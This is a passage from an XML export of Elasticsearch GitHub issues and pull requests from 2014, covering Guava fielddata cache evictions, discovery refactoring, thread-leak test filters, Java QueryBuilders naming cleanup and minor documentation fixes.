</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix unnecessary cache evictions when setting indices.fielddata.cache.size </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7836</link><project id="" key="" /><description>As described in user group posts including 
https://groups.google.com/d/msgid/elasticsearch/07cfb705-1f13-40d5-b7b2-c5b84e328ddb%40googlegroups.com and https://groups.google.com/d/msgid/elasticsearch/14703918-0450-42c1-810b-edf3967951b6%40googlegroups.com

Guava needs some changes to better utilize ram when using eviction by size (e.g., when indices.fielddata.cache.size is set in ES).

Proposed changes to Guava are here https://code.google.com/r/craigwi-guava/.

Update: also opened Guava issue: https://code.google.com/p/guava-libraries/issues/detail?id=1854.
</description><key id="43631977">7836</key><summary>Fix unnecessary cache evictions when setting indices.fielddata.cache.size </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">craigwi</reporter><labels><label>high hanging fruit</label></labels><created>2014-09-23T13:55:21Z</created><updated>2015-11-21T19:05:56Z</updated><resolved>2015-11-21T19:05:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-26T19:17:11Z" id="57007820">@mikemccand any ideas about this?
</comment><comment author="mikemccand" created="2014-09-29T17:15:09Z" id="57194915">Sorry @clintongormley I don't have any insights here.
</comment><comment author="kimchy" created="2014-09-29T18:08:15Z" id="57202950">I looked at it, and I suggest we wait and see how things progress on guava front to address it. I agree with the note that contention on a single AtomicLong can be tricky, though might not be that tricky for non write heavy cases. The global eviction queue suggested there is interesting....
</comment><comment author="kimchy" created="2014-09-29T18:12:04Z" id="57203480">as a side note, we could try and use murmur hash (HPPC has a nice 32bit one) on the hashCode in `IndicesFieldDataCache#Key` class to try and have better hash distribution? @jpountz / @s1monw  what do you think? (if we do so, might make sense to do it on other guava cache entries)
</comment><comment author="plaflamme" created="2014-09-29T18:25:32Z" id="57205557">Would it be possible to allow configuring the number of partitions ES uses? Reducing the number of partitions would be safer than increasing the maximum size of the cache to patch this until guava has an actual solution.
</comment><comment author="kimchy" created="2014-09-29T18:27:12Z" id="57205799">@plaflamme yea, we can add it as an option to configure, though I don't like that its such an expert setting
</comment><comment author="craigwi" created="2014-09-30T03:55:01Z" id="57264194">The issue arises because of the combination of the hash function distribution AND the distribution of the sizes of the elements -- I'm not sure this is solvable with just a new hash function (which might be valuable for other reasons ...).
</comment><comment author="craigwi" created="2014-09-30T16:56:48Z" id="57345822">I thought of another potential mitigation in case guava doesn't take some kind of change like I'm proposing.  If the variation in the size of elements was reduced, the cache memory utilization should go up.  In the case I debugged, the item causing the problem was loaded in ValuesSource.load via the call to indexFieldData.load.  The items loaded in my case were in the 100mb range and the cache segments were only 134mb.  Due to the hash keys, two of these large items would wind up in one cache segment and given the sizes, only one could remain.

If there were some way to break up that structure into smaller pieces (and of course not slow other things down...), that should increase the cache memory utilization.
</comment><comment author="nik9000" created="2014-09-30T17:01:59Z" id="57346593">&gt; The items loaded in my case were in the 100mb range and the cache segments were only 134mb.

I'm not close to the situation but does it make sense to cache things that take up so much of the cache?

It feels silly, but maybe a single segment cache for things over some size and the multi segment cache for smaller things?  It just feels like things so large can't have much contention on them because there just isn't enough heap.
</comment><comment author="jpountz" created="2014-10-14T17:16:49Z" id="59081950">@kimchy Guava already applies a secondary hash to spread the `hashCode()` bits in [LocalCache.rehash](http://grepcode.com/file/repo1.maven.org/maven2/com.google.guava/guava/17.0/com/google/common/cache/LocalCache.java#LocalCache.rehash%28int%29) so I don't think we need to do anything more on our side.
</comment><comment author="s1monw" created="2014-10-16T09:23:21Z" id="59335511">@craigwi we can expose the concurrency level as a setting if that would help until we have a better cache impl that doesn't suffer from this problem?
</comment><comment author="plaflamme" created="2014-10-16T13:59:40Z" id="59365084">@s1monw That would definitely help in the interim. Sadly, Guava doesn't expose write contention metrics, they would have been useful to measure the impact of changing this setting.
</comment><comment author="s1monw" created="2014-10-16T14:43:29Z" id="59372191">I opened a PR to add this setting to all caches we have 
</comment><comment author="craigwi" created="2014-10-16T18:41:02Z" id="59409353">@plaflamme, I agree that the write contention on the field data cache be measured to determine any impact from reducing the concurrency level.

@s1monw, regarding exposing a setting to control this, I do NOT recommend this.  I sent a note to @kimchy through ZenDesk to this effect.  I have suggested to Shay that, after verifying the actual write contention, you set the concurrency level to 1 automatically on the field data cache (either always or only when size-based eviction is used).

Related, I'd like to understand why the default in ES for field data cache is NO eviction policy.  It would seem that if sized-based eviction worked correctly, this would be a better default.
</comment><comment author="plaflamme" created="2014-10-16T19:11:07Z" id="59413993">I agree with the fact that there's no reason to change this value unless you're using sized-based eviction. In which case, you'll probably set this to 1 so that your cap setting is correctly used.

Also, I suspect that the gain of NOT eagerly evicting field data cache entries will outweigh any cost of additional write contention: doing disk IO will always be more expensive than doing more locking (unless the IO happens under the lock).

So setting this to 1 by default when size-based eviction is used would make sense.

Alternatively, you could set it to 2 and overcommit each partition by a small factor. That would already cut write contention by half (assuming the keys are uniformly distributed).
</comment><comment author="s1monw" created="2014-10-17T08:52:28Z" id="59485172">I think we have 2 distinct problems here or at least taht I try to solve. 
1. make it possible to work around potential issues of defaults by setting the concurrency level which can help fixing the problem until we have a good / better default
2. finding a good default value or even default implementation for this cache

the latter will likely not make it into 1.4 GA so I think we should go with 1 as an undocumented option and fix it properly in upcoming releases and even think about an alternative cache impl that doesn't use segment based locking. To me the FieldData Cache is more or less single writer multiple reader or that is at least what we wanna optimize for. the cache we use us pretty much a default cache to be sufficient for write intensive application which we are not. We might be able to come up with something better than working around stuff here? 
</comment><comment author="craigwi" created="2014-10-20T03:47:36Z" id="59680742">Thanks @s1monw.  In the short term, I agree with the proposal to enable us to set the concurrency level.

The longer term question seems to be a choice of whether to go with a circuit breaker approach which necessitates taking proactive steps as soon as one notices the breaker tripped (since customers are likely impacted) OR to go with something else that exhibits a slow degradation in performance, that too has to be noticed, and would give one more time to react.  

The current defaults fit the first approach, of course, and a proper sized-based eviction fielddata cache would fit the later approach.  There must be other ideas...
</comment><comment author="s1monw" created="2014-10-21T13:04:08Z" id="59923609">&gt; The longer term question seems to be a choice of whether to go with a circuit breaker approach which necessitates taking proactive steps as soon as one notices the breaker tripped (since customers are likely impacted) OR to go with something else that exhibits a slow degradation in performance, that too has to be noticed, and would give one more time to react.

To be honest size based evictions often result in cluster meltdown since if you hit the upper limit you keep on loaded and unloading field data which will cause large amount of memory to be allocated and freed etc. you run into GCs due to evictions which are async btw. 
In order to react to situations where you are really close to the limits I think rejecting requests for health reasons is the way to go clients need to deal with this IMO the cluster health is way more important  at that point. 

&gt; The current defaults fit the first approach, of course, and a proper sized-based eviction fielddata cache would fit the later approach. There must be other ideas..

I think we need to fix this caveat here and maybe go with a default concurrency of `1` for field data if the `size` based eviction is used in the field data case. It think that is the right fix for now - to be honest I doubt there will be a big perf impact but we would need to verify - from looking at the code the read operations are most likely not under a lock such that contention is only likely to happen in the write case which I don't think will be very problematic here. 
</comment><comment author="craigwi" created="2014-10-23T16:56:03Z" id="60271024">&gt; To be honest size based evictions often result in cluster meltdown 

If this is true, of course I would prefer orderly failures to meltdown.  We experienced all sorts of problems before we made OOM kill java.exe and before we switched to G1 GC.  Now we see the gradual slowdown when evictions start as I wrote.

Regarding https://github.com/elasticsearch/elasticsearch/pull/8112, I would like to see at least the fielddata cache part of that in a 1.3.x release -- unless 1.4 is imminent.
</comment><comment author="s1monw" created="2014-10-24T09:44:08Z" id="60365955">hey @craigwi I don't think this counts as a bugfix really and therefore I won't backport it to 1.3.x Given the fact that 1.4 is in beta and we moving towards GA soonish it is imminent
</comment><comment author="craigwi" created="2014-10-24T13:51:20Z" id="60389210">Thanks @s1monw.  The fact that ES doesn't behave as documented would seem to me to be as a bug (cf. https://github.com/elasticsearch/elasticsearch/issues/7841), but I recognize back porting is not free or even cheap.  

Will this show up in a 1.4 beta release?  Which one?  I really do want to verify the behavior of the new option ASAP.
</comment><comment author="clintongormley" created="2014-11-28T10:58:05Z" id="64881861">We need to investigate other cache options
</comment><comment author="clintongormley" created="2015-11-21T19:05:56Z" id="158672810">Guava has been removed. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: MulticastChannel should wait on receiver thread to stop during shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7835</link><project id="" key="" /><description>This was signaled by our tests which shutdown class and check for thread leakage.
</description><key id="43624492">7835</key><summary>Internal: MulticastChannel should wait on receiver thread to stop during shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T12:44:39Z</created><updated>2014-10-21T21:40:30Z</updated><resolved>2014-09-27T12:26:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-26T21:35:37Z" id="57023640">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>During discovery, remove any local state and use clusterService.state instead</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7834</link><project id="" key="" /><description>At the moment, ZenDiscovery contains a local copy of the disco nodes plus a flag that indicates whether the local node is master or not. This is redundant as the same information is stored in the cluster state. Have duplicate copy can lead to unneeded concurrency issues. This PR removes the duplication.

The PR introduces a tighter control of the background joining thread to make sure it is started and stopped together with any cluster state changes. This solves potentially concurrency bugs where a joining thread may fail to start.

Last we add a couple of safety checks to make sure that if a nodes receives a cluster state from a new master while actively trying to join another one (or electing itself) we go back to pinging to actively join it.

Note - this is PR is against the 1.x branch.
</description><key id="43620126">7834</key><summary>During discovery, remove any local state and use clusterService.state instead</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T11:55:38Z</created><updated>2015-06-07T12:00:49Z</updated><resolved>2014-09-26T09:23:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Internal: Use internal time estimation for time limited search collector</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7833</link><project id="" key="" /><description>Today `TimeLimitingCollector` uses it's own thread to do time estimations for search request timeouts. This thread is not controllable via threadpools etc. we should use our own infrastructure to signal timeouts. Luckily we already have an estimating thread in the ThreadPool class we just need to expose it to the collector.
</description><key id="43617513">7833</key><summary>Internal: Use internal time estimation for time limited search collector</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T11:23:14Z</created><updated>2014-09-26T12:45:20Z</updated><resolved>2014-09-23T11:37:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Document how to start/stop ES when using a package</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7832</link><project id="" key="" /><description>The current docs tell you how to install using yum/apt, but don't tell you how to start/stop Elasticsearch.

See https://github.com/elasticsearch/elasticsearch-definitive-guide/issues/217
</description><key id="43614975">7832</key><summary>Document how to start/stop ES when using a package</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/debadair/following{/other_user}', u'events_url': u'https://api.github.com/users/debadair/events{/privacy}', u'organizations_url': u'https://api.github.com/users/debadair/orgs', u'url': u'https://api.github.com/users/debadair', u'gists_url': u'https://api.github.com/users/debadair/gists{/gist_id}', u'html_url': u'https://github.com/debadair', u'subscriptions_url': u'https://api.github.com/users/debadair/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/362578?v=4', u'repos_url': u'https://api.github.com/users/debadair/repos', u'received_events_url': u'https://api.github.com/users/debadair/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/debadair/starred{/owner}{/repo}', u'site_admin': False, u'login': u'debadair', u'type': u'User', u'id': 362578, u'followers_url': u'https://api.github.com/users/debadair/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label><label>docs</label></labels><created>2014-09-23T10:51:09Z</created><updated>2016-08-04T12:45:46Z</updated><resolved>2016-08-04T12:45:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2016-08-04T12:45:46Z" id="237541903">Done
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshot/Restore: Add repository validation to URL Repository</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7831</link><project id="" key="" /><description>Follow-up to #7096
</description><key id="43612008">7831</key><summary>Snapshot/Restore: Add repository validation to URL Repository</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">imotov</reporter><labels /><created>2014-09-23T10:15:26Z</created><updated>2015-08-28T00:10:56Z</updated><resolved>2015-08-28T00:10:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>During recovery, mark last file chunk to fail fast if payload is truncated</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7830</link><project id="" key="" /><description>Today we rely on the metadata length of the file we are recoverying
to indicate when the last chunk was received. Yet, this might hide bugs
on the compression layer if payloads are truncated. We should indicate
if the last chunk is send to make sure we validate checksums
accordingly if possible.
</description><key id="43600191">7830</key><summary>During recovery, mark last file chunk to fail fast if payload is truncated</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Recovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T07:52:30Z</created><updated>2015-06-07T12:01:01Z</updated><resolved>2014-09-23T09:34:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-23T09:30:17Z" id="56494970">LGTM. Good catch.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>unused branch in blendTermQuery code</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7829</link><project id="" key="" /><description>Just something I stumpled upon and I am not sure if this is a potential bug.

In the MatchQuery class in the blendTermQuery method there is

```
    if (fuzziness != null) {
        if (mapper != null) {
            Query query = mapper.fuzzyQuery(term.text(), fuzziness, fuzzyPrefixLength, maxExpansions, transpositions);
            if (query instanceof FuzzyQuery) {
                QueryParsers.setRewriteMethod((FuzzyQuery) query, fuzzyRewriteMethod);
            }
        }
        int edits = fuzziness.asDistance(term.text());
        FuzzyQuery query = new FuzzyQuery(term, edits, fuzzyPrefixLength, maxExpansions, transpositions);
        QueryParsers.setRewriteMethod(query, rewriteMethod);
        return query;
    }
```

As far as I can see the if (mapper != null) branch doesn't really do anything. Shouldn't that Query be returned?
</description><key id="43599099">7829</key><summary>unused branch in blendTermQuery code</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mfussenegger</reporter><labels /><created>2014-09-23T07:34:49Z</created><updated>2014-09-29T15:57:55Z</updated><resolved>2014-09-29T15:57:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T15:57:55Z" id="57183237">Hi @mfussenegger 

Yes you're right. Closing this as a duplicate of #6932.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>java: QueryBuilders cleanup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7828</link><project id="" key="" /><description>Some QueryBuilders are missing or have a different naming than the other ones:
- template query does not exist in QueryBuilders. We should add `templateQuery(...)`.
- `commonTerms(...)` should be deprecated and `commonTermsQuery(...)` should be added.
- `textPhrase(...)` was deprecated in 2011. Could be removed.
- `textPhrasePrefix(...)` was deprecated in 2011. Could be removed.
- `queryString(...)` should be deprecated and `queryStringQuery(...)` should be added.
- `simpleQueryString(...)` should be deprecated and `simpleQueryStringQuery(...)` should be added.
- `fieldMaskingSpanQuery(...)` was never documented. Could potentially be removed.
- both `filtered(...)` and `filteredQuery(...)` exist. We could deprecate potentially `filtered(...)`.
- `inQuery(...)` was never documented. Could potentially be removed.
- `wrapperQuery(...)` was never documented. Could potentially be removed.

@s1monw WDYT?
</description><key id="43598719">7828</key><summary>java: QueryBuilders cleanup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>discuss</label></labels><created>2014-09-23T07:28:14Z</created><updated>2014-11-26T14:51:22Z</updated><resolved>2014-11-26T14:51:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-23T07:46:05Z" id="56485661">`fieldMaskingSpanQuery(...)` should not be removed or deprecated yet as it's used in the wild. Potentially could be deprecated when [LUCENE-2878](https://issues.apache.org/jira/browse/LUCENE-2878) will be fixed.
</comment><comment author="dadoonet" created="2014-10-03T09:30:42Z" id="57773544">@clintongormley I think we should may deprecate what is needed to be deprecated in 1.4.0 and then remove in 2.0.0.

WDYT?
</comment><comment author="clintongormley" created="2014-10-14T20:30:27Z" id="59111122">- template query does not exist in QueryBuilders. We should add templateQuery(...).

+1
- textPhrase(...) was deprecated in 2011. Could be removed.
- textPhrasePrefix(...) was deprecated in 2011. Could be removed.

+1
- commonTerms(...) should be deprecated and commonTermsQuery(...) should be added.
- queryString(...) should be deprecated and queryStringQuery(...) should be added.
- simpleQueryString(...) should be deprecated and simpleQueryStringQuery(...) should be added.
- both filtered(...) and filteredQuery(...) exist. We could deprecate potentially filtered(...).

Does it make sense to standardise on longer names (ie xxxQuery) or shorter names?  Whichever way we decide, deprecation in 1.5, remove in 2.0
- inQuery(...) was never documented. Could potentially be removed.

+1
- fieldMaskingSpanQuery(...) was never documented. Could potentially be removed.
- wrapperQuery(...) was never documented. Could potentially be removed.

Both of these are in use in the wild.
</comment><comment author="dadoonet" created="2014-11-26T14:51:22Z" id="64656089">Closed in favor of #8667.

Nota: `filtered` Query was deprecated in 2011 as well.
For now, the PR #8667 uses `xxxQuery` method names as it has less implication. If we want to change `xxxQuery` to `xxx`, then we also need to think about filters which all end with `Filter` like `andFilter`.

For code readability, I think it's better to keep the appended `Query` and `Filter` words in method names.

Because we could end up to write something like:

``` java
filteredQuery(
    termQuery("foo", "bar"),
    termFilter("foo", "bar"))
```

which would become something similar to (depending on imports basically)

``` java
filteredQuery(
    term("foo", "bar"),
    FilterBuilders.term("foo", "bar"))
```

The later is less readable IMHO.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove comma in JSON</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7827</link><project id="" key="" /><description>There was a comma too many in the documentation for the mapping char filter.
</description><key id="43598642">7827</key><summary>Remove comma in JSON</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">HenrikOssipoff</reporter><labels><label>docs</label></labels><created>2014-09-23T07:26:55Z</created><updated>2014-09-28T09:08:42Z</updated><resolved>2014-09-28T09:08:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:04:19Z" id="56850211">Hi @HenrikOssipoff  

Good catch. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="HenrikOssipoff" created="2014-09-25T17:40:05Z" id="56855333">There we go.
</comment><comment author="clintongormley" created="2014-09-28T09:08:18Z" id="57079617">thanks @HenrikOssipoff - merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: java add missing queries / filters</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7826</link><project id="" key="" /><description>Since 1.0, new queries and filters has been added to elasticsearch but were not documented in Java guide:

Queries:
- commonTerms
- functionScoreQuery
- simpleQueryString
- regexpQuery
- spanMultiTermQueryBuilder
- TemplateQueryBuilder

Filters:
- geoHashCellFilter
- regexpFilter
</description><key id="43597942">7826</key><summary>Docs: java add missing queries / filters</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>docs</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T07:14:16Z</created><updated>2015-07-01T20:37:29Z</updated><resolved>2015-07-01T20:35:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Tests: Add a more restrictive thread leaks filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7825</link><project id="" key="" /><description>Today all threads are allowed to leak a suite. This is tricky since
it essentially allows resource leaks by default where for instance
test private TransportClients will never get closed and consume
resources influencing other tests. It also hides threads that
are not fully under elasticsearchs control like the Lucene
TimeLimitingCollector thread. This commit restricts the threads
that can leak a suite to the threads spawned from testclusters
and fixes sevearl places that leaked threads.

Closes #7833
</description><key id="43549228">7825</key><summary>Tests: Add a more restrictive thread leaks filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-22T20:39:53Z</created><updated>2015-03-19T16:28:07Z</updated><resolved>2014-09-23T11:59:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-23T11:03:02Z" id="56504393">one small comment, other than that, LGTM
</comment><comment author="s1monw" created="2014-09-23T11:05:01Z" id="56504549">pushed fixes for the comments
</comment><comment author="kimchy" created="2014-09-23T11:09:30Z" id="56504898">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add total index memory in `_cat/indices`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7824</link><project id="" key="" /><description>This patch adds to `_cat/indices` information about memory usage per index by adding memory used by FieldData, IdCache, Percolate, Segments (memory, index writer, version map).

```
% curl 'localhost:9200/_cat/indices?v&amp;h=i,tm'
i     tm
wiki  8.1gb
test  30.5kb
user  1.9mb
```

Closes #7008
</description><key id="43544025">7824</key><summary>Add total index memory in `_cat/indices`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:CAT API</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-22T20:04:42Z</created><updated>2015-06-06T19:06:22Z</updated><resolved>2014-10-08T12:05:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-26T21:37:11Z" id="57023780">I like it - left one comment
</comment><comment author="dadoonet" created="2014-10-06T13:23:11Z" id="58015703">@s1monw PR updated based on your comment. Indeed, I thought those values can not be null but it's safer to protect that.
</comment><comment author="s1monw" created="2014-10-07T11:37:07Z" id="58171203">LGTM
